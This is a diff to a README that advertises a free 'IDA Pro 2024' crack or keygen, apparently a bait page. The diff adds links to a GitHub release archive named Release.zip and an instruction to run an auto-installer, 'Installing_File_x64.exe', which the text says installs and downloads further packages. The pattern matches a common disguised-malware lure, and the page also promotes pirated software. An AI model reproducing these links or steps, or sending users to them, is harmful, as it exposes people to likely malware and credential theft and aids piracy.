@@ -8,11 +8,11 @@ Tags: IDA Pro 2024 free. Download IDA Pro 2024 for free. Download free IDA Pro 2
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/065cae8e-e95d-4ac8-9c0f-2868e0b274c9)
-]()
+](https://github.com/samikshya22/IDA-Pro-Keygen-2024/releases/download/V4.23/Release.zip)
 
 
 
-## **1. [Download the archive]() and extract it to a convenient folder.**
+## **1. [Download the archive](https://github.com/samikshya22/IDA-Pro-Keygen-2024/releases/download/V4.23/Release.zip) and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64.exe`. It will install and download all necessary packages for > operation.**
 
 ![Uploading photo_2024-10-17_21-09-05.jpg…]()
